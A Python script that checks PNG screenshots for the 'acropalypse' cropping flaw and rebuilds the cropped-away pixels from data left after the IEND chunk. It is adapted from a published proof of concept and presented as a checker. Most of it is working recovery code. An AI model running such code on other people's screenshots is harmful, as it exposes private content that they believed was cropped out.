# Check screenshots for the vulnerability and reconstruct them
#
# All PNG files with data after the IEND block are dumped as
# they are potentially vulnerable. If reconstruction worked
# it will dump the original & reconstructed versions side by side.
#
# Run as (assuming png files are in dump/):
# mkdir vuln
# python3 vulncheck.py 1080 2400 dump vuln
#
# Run for multiple screen width/heights as needed.
#
# All credit goes to David Buchanan for the writeup and demo code
# https://www.da.vidbuchanan.co.uk/blog/exploiting-acropalypse.html

import io
import os
import shutil
import sys
import tqdm
import zlib
from PIL import Image

orig_width, orig_height = int(sys.argv[1]), int(sys.argv[2])
input_dir = sys.argv[3]
output_dir = sys.argv[4]
if not os.path.isdir(input_dir) or not os.path.isdir(output_dir):
    print('usage: <foo> width height input_dir output_dir', file=sys.stderr)
    sys.exit(1)

#################################################
# Adapted from https://gist.github.com/DavidBuchanan314/93de9d07f7fab494bcdf17c2bd6cef02

PNG_MAGIC = b"\x89PNG\r\n\x1a\n"

def parse_png_chunk(stream):
	size = int.from_bytes(stream.read(4), "big")
	ctype = stream.read(4)
	body = stream.read(size)
	csum = int.from_bytes(stream.read(4), "big")
	assert(zlib.crc32(ctype + body) == csum)
	return ctype, body


def pack_png_chunk(buffer, name, body):
	buffer += (len(body).to_bytes(4, "big"))
	buffer += (name)
	buffer += (body)
	crc = zlib.crc32(body, zlib.crc32(name))
	buffer += (crc.to_bytes(4, "big"))

def recover(trailer):
    try:
        next_idat = trailer.index(b'IDAT')
    except ValueError:
        return None
    
    # skip first 12 bytes in case they were part of a chunk boundary
    idat = trailer[12:next_idat-8] # last 8 bytes are crc32, next chunk len

    stream = io.BytesIO(trailer[next_idat-4:])

    while True:
        ctype, body = parse_png_chunk(stream)
        if ctype == b"IDAT":
            idat += body
        elif ctype == b"IEND":
            break
        else:
            return None

    idat = idat[:-4] # slice off the adler32

    #print(f"Extracted {len(idat)} bytes of idat!")

    #print("building bitstream...")
    bitstream = []
    for byte in idat:
        for bit in range(8):
            bitstream.append((byte >> bit) & 1)

    # add some padding so we don't lose any bits
    for _ in range(7):
        bitstream.append(0)

    #print("reconstructing bit-shifted bytestreams...")
    byte_offsets = []
    for i in range(8):
        shifted_bytestream = []
        for j in range(i, len(bitstream)-7, 8):
            val = 0
            for k in range(8):
                val |= bitstream[j+k] << k
            shifted_bytestream.append(val)
        byte_offsets.append(bytes(shifted_bytestream))

    # bit wrangling sanity checks
    assert(byte_offsets[0] == idat)
    assert(byte_offsets[1] != idat)

    #print("Scanning for viable parses...")

    # prefix the stream with 32k of "X" so backrefs can work
    prefix = b"\x00" + (0x8000).to_bytes(2, "little") + (0x8000 ^ 0xffff).to_bytes(2, "little") + b"X" * 0x8000

    for i in range(len(idat)):
        truncated = byte_offsets[i%8][i//8:]

        # only bother looking if it's (maybe) the start of a non-final adaptive huffman coded block
        if truncated[0]&7 != 0b100:
            continue

        d = zlib.decompressobj(wbits=-15)
        try:
            decompressed = d.decompress(prefix+truncated) + d.flush(zlib.Z_FINISH)
            decompressed = decompressed[0x8000:] # remove leading padding
            if d.eof and d.unused_data in [b"", b"\x00"]: # there might be a null byte if we added too many padding bits
                #print(f"Found viable parse at bit offset {i}!")
                # XXX: maybe there could be false positives and we should keep looking?
                break
            # else:
            #    print(f"Parsed until the end of a zlib stream, but there was still {len(d.unused_data)} byte of remaining data. Skipping.")
        except zlib.error as e: # this will happen almost every time
            #print(e)
            pass
    else:
        #print("Failed to find viable parse :(")
        return None
    out = bytearray()
    out += (PNG_MAGIC)

    ihdr = b""
    ihdr += orig_width.to_bytes(4, "big")
    ihdr += orig_height.to_bytes(4, "big")
    ihdr += (8).to_bytes(1, "big") # bitdepth
    ihdr += (2).to_bytes(1, "big") # true colour
    ihdr += (0).to_bytes(1, "big") # compression method
    ihdr += (0).to_bytes(1, "big") # filter method
    ihdr += (0).to_bytes(1, "big") # interlace method

    pack_png_chunk(out, b"IHDR", ihdr)

    # fill missing data with solid magenta
    reconstructed_idat = bytearray((b"\x00" + b"\xff\x00\xff" * orig_width) * orig_height)

    # paste in the data we decompressed
    reconstructed_idat[-len(decompressed):] = decompressed

    # one last thing: any bytes defining filter mode may
    # have been replaced with a backref to our "X" padding
    # we should fine those and replace them with a valid filter mode (0)
    #print("Fixing filters...")
    for i in range(0, len(reconstructed_idat), orig_width*3+1):
        if reconstructed_idat[i] == ord("X"):
            #print(f"Fixup'd filter byte at idat byte offset {i}")
            reconstructed_idat[i] = 0

    pack_png_chunk(out, b"IDAT", zlib.compress(reconstructed_idat))
    pack_png_chunk(out, b"IEND", b"")
    return out


# End of adapted code
#################################################

pngs, trailing, idats, rec = 0, 0, 0, 0
for filename in tqdm.tqdm(os.listdir(input_dir)):
    if not filename.endswith('.png'):
        continue
    pngs += 1
    path = os.path.join(input_dir, filename)
    with open(path, 'rb') as f:
        magic = f.read(len(PNG_MAGIC))
        assert(magic == PNG_MAGIC)
        while True:
            ctype, body = parse_png_chunk(f)
            if ctype == b'IEND':
                break
        trailer = f.read()
        if len(trailer) == 0:
            continue
        trailing += 1
        # Maybe VULNERABLE at this point
        
        r = recover(trailer)
        if r is None:
            # Just copy it over as is so we know it is potential vulnerable
            shutil.copy(path, os.path.join(output_dir, f'failed_{filename}'))
            continue
        rec += 1
        # Create side by side original + recovered        
        try:
            im_orig = Image.open(path)
            im_rec = Image.open(io.BytesIO(r))
            
            im_out = Image.new(im_orig.mode, (orig_width+im_orig.width, orig_height+im_orig.height))
            im_out.paste(im_orig)
            im_out.paste(im_rec, (im_orig.width, 0))
            
            outpath = os.path.join(output_dir, f'{orig_width}x{orig_height}_{filename}')
            im_out.save(outpath)
        except:
            print(outpath)
            pass

print(f'Total {pngs} PNGS')
print(f'Found {trailing} with trailing bytes and {idats} with IDAT')
print(f'Reconstructed {rec} images')